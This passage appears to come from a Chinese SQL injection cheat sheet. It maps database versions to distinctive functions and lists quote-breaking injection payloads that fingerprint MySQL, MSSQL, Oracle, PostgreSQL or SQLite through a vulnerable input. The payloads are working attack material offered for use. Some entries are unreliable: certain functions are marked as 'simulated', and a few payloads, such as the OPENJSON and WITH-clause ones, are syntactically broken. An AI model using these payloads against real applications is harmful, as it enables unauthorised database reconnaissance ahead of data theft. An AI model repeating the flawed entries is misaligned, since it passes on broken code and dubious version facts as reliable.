## 二、数据库指纹深度识别

### 2.1 版本特征探测
```sql
-- MySQL版本细分
MySQL 5.0/5.1: @@version_comment LIKE '%MySQL%' AND VERSION() LIKE '5.0%'
MySQL 5.5/5.6: @@innodb_version LIKE '5.5%' / TO_SECONDS(NOW())可用
MySQL 5.7: JSON_EXTRACT/JSON_OBJECT/SYS库可用
MySQL 8.0: WITH RECURSIVE/CTE/窗口函数/REGEXP_REPLACE/TABLE语句可用

-- MSSQL版本细分
MSSQL 2000: TEXTPTR/READTEXT/SYSOBJECTS
MSSQL 2005: XML路径/CTE/SYS.TABLES
MSSQL 2008: FOR XML PATH/AUTO
MSSQL 2012: IIF/CHOOSE/LEAD/LAG
MSSQL 2016: OPENJSON/JSON_VALUE/STRING_SPLIT
MSSQL 2017: TRANSLATE/TRIM/STRING_AGG
MSSQL 2019: APPROX_COUNT_DISTINCT/智能查询处理/UTF8排序规则
MSSQL 2022: GENERATE_SERIES/ISJSON增强
MSSQL 2025: AI_PREDICT/VECTOR_DISTANCE（模拟AI函数语义绕过）

-- Oracle版本细分
Oracle 11g: XMLType/EXTRACTVALUE/NUMTOYMINTERVAL延迟
Oracle 12c: JSON_VALUE/多租户V$PDBS/私有临时表
Oracle 18c/19c: JSON_SERIALIZE/LISTAGG SQL Macros/多态表函数
Oracle 21c: 原生JSON类型/模拟DBMS_PYTHON
Oracle 23ai: AI_SQL_GENERATE/VECTOR_DISTANCE/向量语义查询

-- PostgreSQL: VERSION() LIKE '%PostgreSQL%' / pg_sleep() / current_database()
-- SQLite: sqlite_version() / randomblob()
```

### 2.2 快速指纹Payload
```sql
-- 通用
' AND @@version IS NOT NULL--           → MySQL/MSSQL
' AND version() IS NOT NULL--            → PostgreSQL/MySQL
' AND (SELECT COUNT(*) FROM v$version)>0-- → Oracle
' AND sqlite_version() IS NOT NULL--     → SQLite

-- 细分（无需UNION）
' AND LENGTH(@@version)>0--              → MySQL/MSSQL
' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--
' AND TO_SECONDS(NOW())>0--              → MySQL 5.5+
' AND JSON_EXTRACT('{}','$.a') IS NULL-- → MySQL 5.7+/Pg 9.3+
' AND OPENJSON('{}') IS NOT NULL--       → MSSQL 2016+
' WITH cte AS (SELECT 1) SELECT*FROM cte-- → MySQL 8.0/MSSQL 2005+
```

